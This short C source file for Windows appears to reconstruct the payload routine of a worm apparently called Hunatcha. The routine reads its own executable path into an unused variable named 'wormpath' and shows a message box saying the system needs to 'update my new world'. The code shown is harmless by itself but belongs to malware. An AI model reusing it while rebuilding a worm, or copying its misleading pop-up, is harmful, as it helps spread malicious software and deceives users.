#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>

void _Payload(void)
{
    char wormpath[MAX_PATH];
    GetModuleFileNameA(NULL, wormpath, MAX_PATH);
    // (wormpath is unused, as in original)

    char msg[MAX_PATH];
    strcpy(msg, "Your system need to update my new world...");
    MessageBoxA(NULL, msg, "Hunatcha Informer", MB_ICONINFORMATION);
}
#pragma optimize("", on)
